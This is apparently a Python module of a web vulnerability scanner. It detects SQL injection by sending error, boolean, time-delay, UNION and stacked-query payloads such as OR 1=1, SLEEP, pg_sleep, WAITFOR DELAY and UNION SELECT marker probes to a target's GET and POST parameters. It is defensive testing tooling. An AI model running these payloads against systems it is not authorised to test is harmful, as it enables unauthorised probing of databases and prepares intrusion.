import re
import time
import logging
import random
import string
from collections import Counter, defaultdict

from core.finding import Finding
from scanners.base import BaseScanner
from core.response_analyzer import ResponseAnalyzer

logger = logging.getLogger('SeaScanner.SQLi')

# SQL Injection scanner - evidence-only (v4, SOP Phase 3.1).
#
# The scanner never classifies: it only collects raw evidence for a set of
# independent injection techniques, each of which is only emitted as a
# confirmed observation after repeated confirmation with a *different* payload:
#
#   1. error_based      - a database error signature matches on the primary payload
#                         AND on a second, distinct payload (no single-signature
#                         confirmation). Carries the matched database/rule.
#   2. boolean_based    - true/false payloads consistently produce different
#                         responses (length, status, content similarity) AND a
#                         second independent true/false pair (comment-injection
#                         construction) differentiates the same way.
#   3. time_based       - a delay payload exceeds the baseline latency AND a retry
#                         reproduces the delay (retry consistency + variance).
#   4. union_based      - the vulnerable column count is located via an ORDER BY
#                         oracle, then a UNION SELECT reflects a unique marker in a
#                         chosen column; a second distinct marker/column order
#                         confirms the reflection (non-regex corroboration).
#   5. stacked_queries  - where the fingerprinted DBMS supports statement stacks
#                         (MSSQL/PostgreSQL), a stacked statement reproduces a
#                         conditional delay across two independent payloads. Only
#                         tested when another technique already fingerprinted a
#                         stacking-capable DBMS, so it never fires alone.
#
# DBMS fingerprinting is independent of any single technique: every observation
# contributes a database candidate with provenance, and the scanner aggregates
# a per-DB confidence so the report never claims a database on a single signal.
#
# The engine derives status/severity/confidence/verification from the evidence.
# Confidence is therefore dynamic (evidence count, independent observations,
# payload confirmation, verification passes) - never a static value.


class SQLiScanner(BaseScanner):

    # Minimum response difference that counts as a boolean-based signal.
    BOOLEAN_LEN_THRESHOLD = 40
    BOOLEAN_SIM_THRESHOLD = 0.8

    # Upper bound for UNION column-count discovery.
    UNION_COLUMN_MAX = 20

    # DBMS that support statement stacking (used to gate stacked-query tests).
    STACKED_PAYLOADS = {
        'mssql': {
            'primary': "'; WAITFOR DELAY '00:00:04'-- -",
            'confirm': "'; WAITFOR DELAY '00:00:03'-- -",
        },
        'postgresql': {
            'primary': "'; SELECT pg_sleep(4)-- -",
            'confirm': "'; SELECT pg_sleep(3)-- -",
        },
        'mysql': {
            'primary': "'; SELECT IF(1=1, SLEEP(4), 0)-- -",
            'confirm': "'; SELECT IF(1=1, SLEEP(3), 0)-- -",
        },
    }
    # Stacked detection requires this many seconds over baseline.
    STACKED_MIN_DELAY = 3.0

    def __init__(self, target: str, session=None, post_data: dict = None):
        super().__init__(target, session, post_data)
        self.name = "SQL Injection"

        # Structured DBMS signature rules (error-based fingerprint).
        self.db_signatures = {
            'mysql': [
                r'You have an error in your SQL syntax',
                r'MySQL server version for the right syntax',
                r'#\d{4} at line \d+',
                r'MariaDB server version',
                r'SQL syntax.*?near',
            ],
            'postgresql': [
                r'ERROR:\s+syntax error at or near',
                r'PG::SyntaxError',
                r'psycopg2\.errors\.SyntaxError',
                r'ERROR:\s+relation .* does not exist',
            ],
            'mssql': [
                r'Unclosed quotation mark after',
                r'Incorrect syntax near',
                r'Microsoft OLE DB Provider for SQL Server',
                r'Exception.*SqlException',
            ],
            'oracle': [
                r'ORA-\d{4,5}',
                r'Oracle.*(Driver|server)',
                r'PL/SQL: ORA-\d+',
            ],
            'sqlite': [
                r'near ".*": syntax error',
                r'SQLiteException: unrecognized token',
                r'sqlite3\.(DatabaseError|OperationalError)',
                r'SQL logic error',
            ],
        }

        # Error-based payloads - a broken SQL statement that provokes a driver /
        # database error message into the response when reflected into a query.
        self.error_payloads = [
            "'",
            '"',
            "' OR '1'='1",
            "' AND '1'='1",
            "' OR 1=1-- -",
            '" OR 1=1-- -',
            "' OR ID=ID-- -",
        ]

        # Time-based delay payloads per database engine.
        self.time_payloads = {
            'mysql': [
                "' AND SLEEP(5)-- -",
                "' OR SLEEP(5)-- -",
                "' AND BENCHMARK(5000000,MD5('test'))-- -",
            ],
            'postgresql': [
                "' AND pg_sleep(5)-- -",
                "' OR pg_sleep(5)-- -",
            ],
            'mssql': [
                "' WAITFOR DELAY '00:00:05'-- -",
            ],
            'oracle': [
                "' AND (SELECT COUNT(*) FROM ALL_OBJECTS a, ALL_OBJECTS b, ALL_OBJECTS c, ALL_OBJECTS d)>0-- -",
            ],
        }

        # Boolean-based true/false pairs.
        self.boolean_true_payloads = [
            "' AND '1'='1'-- -",
            "' OR '1'='1'-- -",
        ]
        self.boolean_false_payloads = [
            "' AND '1'='2'-- -",
            "' OR '1'='2'-- -",
        ]
        # Independent comment-injection pair used to *confirm* a boolean signal
        # with a second, different construction (avoids single-pair reliance).
        self.comment_true_payload = "'/**/OR/**/1=1-- -"
        self.comment_false_payload = "'/**/AND/**/1=2-- -"

        # Cross-technique DBMS candidates accumulated during a scan.
        self._db_candidates = set()
        self._db_provenance = defaultdict(list)
        # Unique marker generator for UNION reflection.
        self._marker_nonce = 0

    # ------------------------------------------------------------------
    # scan() - evidence-only orchestration
    # ------------------------------------------------------------------

    def scan(self) -> Finding:
        finding = Finding()
        finding.module = self.name

        try:
            params = self.get_params()
            post_keys = list((self.post_data or {}).keys())
            has_params = bool(params or post_keys)

            if not has_params:
                finding.add_evidence(
                    self._evidence_builder.verified(
                        "No URL parameters or POST data found to test for SQL injection",
                        payload=None,
                    )
                )
                finding.tests_passed = 0
                return finding

            observations = []
            tests = 0
            techniques = set()

            get_targets = params
            post_targets = post_keys

            # Error-based
            obs, tested = self._check_error_based(get_targets, 'GET')
            tests += tested
            for o in obs:
                observations.append(o)
                techniques.add(o['technique'])
            if post_targets:
                obs, tested = self._check_error_based(post_targets, 'POST')
                tests += tested
                for o in obs:
                    observations.append(o)
                    techniques.add(o['technique'])

            # Time-based
            obs, tested = self._check_time_based(get_targets, 'GET')
            tests += tested
            for o in obs:
                observations.append(o)
                techniques.add(o['technique'])
            if post_targets:
                obs, tested = self._check_time_based(post_targets, 'POST')
                tests += tested
                for o in obs:
                    observations.append(o)
                    techniques.add(o['technique'])

            # Union-based (non-regex corroboration; also fingerprints DBMS).
            obs, tested = self._check_union_based(get_targets, 'GET')
            tests += tested
            for o in obs:
                observations.append(o)
                techniques.add(o['technique'])
            if post_targets:
                obs, tested = self._check_union_based(post_targets, 'POST')
                tests += tested
                for o in obs:
                    observations.append(o)
                    techniques.add(o['technique'])

            # Boolean-based
            obs, tested = self._check_boolean_based(get_targets, 'GET')
            tests += tested
            for o in obs:
                observations.append(o)
                techniques.add(o['technique'])
            if post_targets:
                obs, tested = self._check_boolean_based(post_targets, 'POST')
                tests += tested
                for o in obs:
                    observations.append(o)
                    techniques.add(o['technique'])

            # Stacked queries (only when a stacking-capable DBMS was fingerprinted).
            obs, tested = self._check_stacked_queries(get_targets, 'GET')
            tests += tested
            for o in obs:
                observations.append(o)
                techniques.add(o['technique'])
            if post_targets:
                obs, tested = self._check_stacked_queries(post_targets, 'POST')
                tests += tested
                for o in obs:
                    observations.append(o)
                    techniques.add(o['technique'])

            finding.tests_performed = tests
            finding.tests_run = tests

            # Confirmed observations first so a FAIL finding's lead evidence is
            # never a positive/reassuring observation.
            observations.sort(key=lambda o: self._TECHNIQUE_ORDER.get(o['technique'], 9))

            if observations:
                for obs in observations:
                    self._emit_observation(finding, obs)

                if len(techniques) >= 2:
                    self._emit_cross_validation(finding, techniques)

                finding.tests_passed = max(0, tests - len(observations))
                finding.fingerprint['sqli_signals'] = [
                    {
                        'technique': o['technique'],
                        'parameter': o['param'],
                        'method': o['method'],
                        'database': o.get('db'),
                    }
                    for o in observations
                ]
                dbs = sorted({o['db'] for o in observations if o.get('db')})
                if dbs:
                    finding.fingerprint['database'] = dbs
                # Structured, provenance-aware DBMS fingerprint.
                finding.fingerprint['database_fingerprint'] = self._db_fingerprint()
            else:
                finding.add_evidence(
                    self._evidence_builder.verified(
                        f"No SQL injection detected. Tested {tests} payloads.",
                        payload=None,
                    )
                )
                finding.tests_passed = tests

        except Exception as e:
            finding.add_evidence(
                self._evidence_builder.error(
                    f"Error during SQL injection scan: {str(e)}", payload=None
                )
            )
            finding.scan_errors += 1

        return finding

    # Confirmed observations are emitted as structured request/response evidence
    # with the matched rule, detection method, reliability and reproducibility
    # metadata attached. Every emitted observation is the result of repeated
    # confirmation with an independent payload.
    def _emit_observation(self, finding, obs):
        resp = obs['resp']
        payload = obs['payload']
        param = obs['param']
        method = obs['method']

        request_info = {
            'method': method,
            'url': self._request_url(param, payload, method),
            'headers': dict(self.session.headers),
            'payload': payload,
        }
        response_info = {
            'status_code': resp.status_code,
            'headers': dict(resp.headers),
            'body_length': len(resp.text),
            'body_snippet': resp.text[:300],
            'elapsed': resp.elapsed.total_seconds() if resp.elapsed else None,
        }

        ev = self._evidence_builder.request_response(
            obs['desc'],
            request=request_info,
            response=response_info,
            payload=payload,
            endpoint=self.target,
            parameter=param,
            method=method,
        )
        ev.raw_data.update({
            'technique': obs['technique'],
            'matched_rule': obs.get('matched_rule'),
            'detection_method': obs.get('detection_method'),
            'database': obs.get('db'),
            'database_confidence': obs.get('db_confidence'),
            'reliability': obs.get('reliability', 'medium'),
            'reproducible': True,
            'reproducibility': obs.get('reproducibility', 2),
            'independence': obs.get('independence', 'distinct confirm payload'),
            'confirm_payload': obs.get('confirm_payload'),
        })
        if 'timing' in obs:
            ev.raw_data['timing'] = obs['timing']
        if 'comparison' in obs:
            ev.raw_data['comparison'] = obs['comparison']
        # Every emitted observation is the result of repeated confirmation.
        ev.verification_pass = max(getattr(ev, 'verification_pass', 0), obs.get('reproducibility', 2))
        ev.verification_method = obs.get('verification_method', "primary + confirm payloads")
        finding.add_evidence(ev)

    def _emit_cross_validation(self, finding, techniques):
        ev = self._evidence_builder.cross_validation(
            "SQL injection confirmed by multiple independent techniques "
            f"({', '.join(sorted(techniques))})",
            payload=None,
        )
        ev.verification_pass = len(techniques)
        ev.verification_method = f"{len(techniques)} independent techniques"
        finding.add_evidence(ev)

    # ------------------------------------------------------------------
    # Error-based
    # ------------------------------------------------------------------

    def _check_error_based(self, params, method='GET'):
        observations = []
        payloads_tested = 0
        for param in params:
            for payload in self.error_payloads:
                payloads_tested += 1
                resp = self._send(param, payload, method, timeout=10)
                if resp is None:
                    continue
                matched = self._match_db_signature(resp.text)
                if not matched:
                    continue
                # Repeated confirmation: a different payload must reproduce a
                # database error signature.
                confirm_payload = (
                    "' OR 1=1-- -" if "'" in payload else '" OR 1=1-- -'
                )
                payloads_tested += 1
                confirm_resp = self._send(param, confirm_payload, method, timeout=10)
                if confirm_resp is None or not self._match_db_signature(confirm_resp.text):
                    continue
                self._record_db(matched['db'], 'error_based')
                found = {
                    'technique': 'error_based',
                    'param': param,
                    'method': method,
                    'payload': payload,
                    'confirm_payload': confirm_payload,
                    'resp': confirm_resp,
                    'db': matched['db'],
                    'matched_rule': matched['rule'],
                    'detection_method': 'database error signature (regex rule)',
                    'reliability': 'high',
                    'reproducibility': 2,
                    'independence': 'distinct confirm payload',
                    'verification_method': 'two distinct error payloads',
                    'desc': (
                        f"SQL error-based injection in {method} parameter "
                        f"'{param}': {matched['rule']}"
                    ),
                }
                observations.append(self._finalize_db_confidence(found))
                break  # one confirmed error signal per parameter is enough
        return observations, payloads_tested

    def _match_db_signature(self, text):
        """Return {'db', 'rule'} for the first database signature matched, or None."""
        for db, patterns in self.db_signatures.items():
            for pattern in patterns:
                if re.search(pattern, text, re.IGNORECASE):
                    return {'db': db, 'rule': pattern}
        return None

    # ------------------------------------------------------------------
    # Boolean-based
    # ------------------------------------------------------------------

    def _check_boolean_based(self, params, method='GET'):
        observations = []
        payloads_tested = 0
        base_resp = self._send_plain(params, method)
        if base_resp is None:
            return observations, payloads_tested
        base_len = len(base_resp.text)
        base_status = base_resp.status_code

        for param in params:
            for true_payload in self.boolean_true_payloads:
                true_resp = self._send(param, true_payload, method, timeout=10)
                if true_resp is None:
                    payloads_tested += 1
                    continue
                payloads_tested += 1
                true_len = len(true_resp.text)
                true_status = true_resp.status_code

                for false_payload in self.boolean_false_payloads:
                    false_resp = self._send(param, false_payload, method, timeout=10)
                    if false_resp is None:
                        payloads_tested += 1
                        continue
                    payloads_tested += 1
                    false_len = len(false_resp.text)
                    false_status = false_resp.status_code

                    if not self._boolean_differentiates(
                        true_resp, false_resp, true_len, false_len,
                        true_status, false_status,
                    ):
                        continue

                    # Repeated confirmation with an independent construction.
                    confirm_true = self._send(
                        param, self.comment_true_payload, method, timeout=10)
                    payloads_tested += 1
                    confirm_false = self._send(
                        param, self.comment_false_payload, method, timeout=10)
                    payloads_tested += 1
                    if confirm_true is None or confirm_false is None:
                        continue
                    if not self._boolean_differentiates(
                        confirm_true, confirm_false,
                        len(confirm_true.text), len(confirm_false.text),
                        confirm_true.status_code, confirm_false.status_code,
                    ):
                        continue

                    observations.append({
                        'technique': 'boolean_based',
                        'param': param,
                        'method': method,
                        'payload': true_payload,
                        'confirm_payload': self.comment_true_payload,
                        'resp': true_resp,
                        'db': None,
                        'matched_rule': 'true/false response differentiation '
                                        '(length/status/content) + comment-injection pair',
                        'detection_method': 'behavioral true/false differential '
                                           '(no single-response regex)',
                        'reliability': 'high',
                        'reproducibility': 2,
                        'independence': 'comment-injection true/false pair',
                        'verification_method': 'two independent true/false pairs',
                        'comparison': {
                            'base_length': base_len,
                            'base_status': base_status,
                            'true_length': true_len,
                            'true_status': true_status,
                            'false_length': false_len,
                            'false_status': false_status,
                            'similarity_true_false': round(
                                ResponseAnalyzer.body_similarity(
                                    true_resp.text, false_resp.text), 3),
                        },
                        'desc': (
                            f"SQL boolean-based injection in {method} parameter "
                            f"'{param}': true/false payloads consistently produce "
                            f"different responses"
                        ),
                    })
                    break
                if observations and observations[-1]['technique'] == 'boolean_based':
                    break
        return observations, payloads_tested

    def _boolean_differentiates(self, r1, r2, len1, len2, status1, status2):
        """True when two responses differ in a way consistent with a conditional
        in the SQL predicate (length, status or content similarity)."""
        if status1 != status2:
            return True
        if abs(len1 - len2) >= self.BOOLEAN_LEN_THRESHOLD:
            return True
        try:
            sim = ResponseAnalyzer.body_similarity(r1.text, r2.text)
        except Exception:
            return False
        return sim < self.BOOLEAN_SIM_THRESHOLD

    # ------------------------------------------------------------------
    # Time-based
    # ------------------------------------------------------------------

    def _check_time_based(self, params, method='GET'):
        observations = []
        baseline = self.get_baseline_time(method, samples=3)
        if baseline is None:
            return observations, 0
        threshold = max(baseline + 4, 6)
        payloads_tested = 0

        for param in params:
            for db, payloads in self.time_payloads.items():
                for payload in payloads:
                    payloads_tested += 1
                    elapsed1, resp1 = self._time_request(param, payload, method)
                    if elapsed1 is None or elapsed1 < threshold:
                        continue
                    # Retry consistency: a second, independent request must
                    # reproduce the delay (rules out one-off network variance).
                    elapsed2, resp2 = self._time_request(param, payload, method)
                    payloads_tested += 1
                    if elapsed2 is None or elapsed2 < threshold:
                        continue
                    variance = abs(elapsed1 - elapsed2)
                    self._record_db(db, 'time_based')
                    observations.append({
                        'technique': 'time_based',
                        'param': param,
                        'method': method,
                        'payload': payload,
                        'confirm_payload': payload,
                        'resp': resp2 or resp1,
                        'db': db,
                        'matched_rule': f'conditional delay for {db}',
                        'detection_method': f'{db} delay payload + retry timing-variance check',
                        'reliability': 'high',
                        'reproducibility': 2,
                        'independence': 'repeated request (retry consistency)',
                        'verification_method': 'two delayed requests within variance',
                        'timing': {
                            'baseline_latency': round(baseline, 3),
                            'threshold': round(threshold, 3),
                            'delay_latency': round(elapsed1, 3),
                            'retry_latency': round(elapsed2, 3),
                            'retry_variance': round(variance, 3),
                        },
                        'desc': (
                            f"SQL time-based injection in {method} parameter "
                            f"'{param}': '{payload}' delayed the response "
                            f"{elapsed1:.1f}s vs {baseline:.1f}s baseline "
                            f"(retry {elapsed2:.1f}s, consistent)"
                        ),
                    })
                    break
                if observations and observations[-1]['technique'] == 'time_based':
                    break
            if observations and observations[-1]['db']:
                break
        return observations, payloads_tested

    def _time_request(self, param, payload, method):
        """Send a request and return (elapsed_seconds, response), or (None, None)."""
        try:
            start = time.time()
            resp = self._send(param, payload, method, timeout=30)
            if resp is None:
                return None, None
            return time.time() - start, resp
        except Exception:
            return None, None

    # ------------------------------------------------------------------
    # UNION-based
    # ------------------------------------------------------------------

    def _check_union_based(self, params, method='GET'):
        observations = []
        payloads_tested = 0
        for param in params:
            base = self._send_plain(params, method)
            if base is None:
                continue
            base_text = base.text or ''
            base_status = base.status_code
            base_len = len(base_text)

            # 1) Column-count oracle via ORDER BY. n is valid while the response
            # stays identical to baseline; the first invalid n (DB error) reveals
            # the column count is n-1.
            col_count = None
            for n in range(1, self.UNION_COLUMN_MAX + 1):
                payloads_tested += 1
                resp = self._send(param, f"' ORDER BY {n}-- -", method, timeout=10)
                if resp is None:
                    continue
                if self._boolean_differentiates(
                    base, resp, base_len, len(resp.text or ''),
                    base_status, resp.status_code,
                ):
                    col_count = n - 1
                    break
            if col_count is None or col_count < 1:
                continue

            # 2) UNION SELECT: NULLs in every column except one which carries a
            #    distinctive marker; reflection of that marker is non-regex proof.
            marker1 = self._union_marker()
            select_cols = ', '.join(['NULL'] * (col_count - 1) + [f"'{marker1}'"])
            union1 = f"' UNION SELECT {select_cols}-- -"
            payloads_tested += 1
            resp1 = self._send(param, union1, method, timeout=10)
            if resp1 is None or marker1 not in (resp1.text or ''):
                continue

            # Confirmation: a different marker in a different-order UNION must
            # also reflect (independent observation).
            marker2 = self._union_marker()
            cols2 = ', '.join([f"'{marker2}'"] + ['NULL'] * (col_count - 1))
            union2 = f"' UNION SELECT {cols2}-- -"
            payloads_tested += 1
            resp2 = self._send(param, union2, method, timeout=10)
            if resp2 is None or marker2 not in (resp2.text or ''):
                continue

            db = None
            observations.append({
                'technique': 'union_based',
                'param': param,
                'method': method,
                'payload': union1,
                'confirm_payload': union2,
                'resp': resp1,
                'db': None,
                'matched_rule': f'UNION reflection across {col_count} columns',
                'detection_method': 'UNION SELECT marker reflection (non-regex)',
                'reliability': 'high',
                'reproducibility': 2,
                'independence': 'distinct marker + reordered columns',
                'verification_method': 'two reflected UNION markers',
                'comparison': {
                    'forced_columns': col_count,
                    'marker1_reflected': True,
                    'marker2_reflected': True,
                    'marker1': marker1,
                    'marker2': marker2,
                },
                'desc': (
                    f"SQL UNION-based injection in {method} parameter '{param}': "
                    f"{col_count}-column UNION SELECT reflected an injected marker"
                ),
            })
            break
        return observations, payloads_tested

    def _union_marker(self):
        self._marker_nonce += 1
        rand = ''.join(random.choice(string.ascii_letters) for _ in range(8))
        return f"qx{self._marker_nonce}{rand}_uni"

    # ------------------------------------------------------------------
    # Stacked queries (DBMS-aware)
    # ------------------------------------------------------------------

    def _check_stacked_queries(self, params, method='GET'):
        observations = []
        # Only active when another technique already fingerprinted a
        # stacking-capable DBMS (never the sole signal).
        applicable = sorted(set(self._db_candidates) &
                            set(self.STACKED_PAYLOADS.keys()))
        if not applicable:
            return observations, 0
        baseline = self.get_baseline_time(method, samples=3)
        if baseline is None:
            return observations, 0
        payloads_tested = 0
        for param in params:
            for db in applicable:
                primary = self.STACKED_PAYLOADS[db]['primary']
                confirm = self.STACKED_PAYLOADS[db]['confirm']
                elapsed1, resp1 = self._time_request(param, primary, method)
                payloads_tested += 1
                if elapsed1 is None or elapsed1 < max(baseline + self.STACKED_MIN_DELAY, 6):
                    continue
                elapsed2, resp2 = self._time_request(param, confirm, method)
                payloads_tested += 1
                if elapsed2 is None or elapsed2 < max(baseline + 2, 5):
                    continue
                observations.append({
                    'technique': 'stacked_queries',
                    'param': param,
                    'method': method,
                    'payload': primary,
                    'confirm_payload': confirm,
                    'resp': resp2 or resp1,
                    'db': db,
                    'matched_rule': f'stacked statement delay for {db}',
                    'detection_method': f'stacked {db} statement (delay)',
                    'reliability': 'high',
                    'reproducibility': 2,
                    'independence': 'distinct stacked confirm statement',
                    'verification_method': 'two independent stacked delay statements',
                    'timing': {
                        'baseline_latency': round(baseline, 3),
                        'primary_latency': round(elapsed1, 3),
                        'confirm_latency': round(elapsed2, 3),
                    },
                    'desc': (
                        f"SQL stacked-queries injection in {method} parameter "
                        f"'{param}': stacked {db} statement delayed the response "
                        f"({elapsed1:.1f}s, confirm {elapsed2:.1f}s)"
                    ),
                })
                break
            if observations and observations[-1]['technique'] == 'stacked_queries':
                break
        return observations, payloads_tested

    # ------------------------------------------------------------------
    # DBMS fingerprinting
    # ------------------------------------------------------------------

    def _record_db(self, db, technique):
        if db:
            self._db_candidates.add(db)
            self._db_provenance[db].append(technique)

    def _finalize_db_confidence(self, found):
        """Attach DBMS confidence from the current provenance aggregates."""
        if found.get('db'):
            self._db_candidates.add(found['db'])
        found['db_confidence'] = self._db_confidence(found.get('db'))
        return found

    def _db_confidence(self, db):
        if not db or db not in self._db_provenance:
            return 0
        techniques = set(self._db_provenance[db])
        # More independent techniques that agree on the same DB -> higher certainty.
        base = min(60 + 15 * len(techniques), 95)
        # Penalise uncertainty when other DBs were also observed.
        alternate = len(self._db_candidates) - 1
        base = max(30, base - 10 * alternate)
        return min(95, base)

    def _db_fingerprint(self):
        """Provenance-aware per-DB confidence fingerprint."""
        entries = []
        for db, techniques in self._db_provenance.items():
            unique = sorted(set(techniques))
            confidence = self._db_confidence(db)
            entries.append({
                'database': db,
                'confidence': confidence,
                'techniques': unique,
                'observations': len(techniques),
            })
        if not entries:
            return []
        total_obs = sum(e['observations'] for e in entries)
        for e in entries:
            e['share'] = round(e['observations'] / total_obs, 3) if total_obs else 0
        return sorted(entries, key=lambda e: e['confidence'], reverse=True)

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------

    _TECHNIQUE_ORDER = {
        'error_based': 0,
        'time_based': 1,
        'boolean_based': 2,
        'union_based': 3,
        'stacked_queries': 4,
    }

    def _send(self, param, payload, method, timeout=10):
        try:
            if method == 'GET':
                return self.session.get(self.inject_payload(param, payload), timeout=timeout)
            data = self.post_data.copy()
            data[param] = payload
            return self.session.post(self.target, data=data, timeout=timeout)
        except Exception:
            return None

    def _send_plain(self, params, method):
        try:
            if method == 'GET':
                return self.session.get(self.target, timeout=10)
            return self.session.post(self.target, data=self.post_data or {}, timeout=10)
        except Exception:
            return None

    def _request_url(self, param, payload, method):
        if method == 'GET':
            return self.inject_payload(param, payload)
        return self.target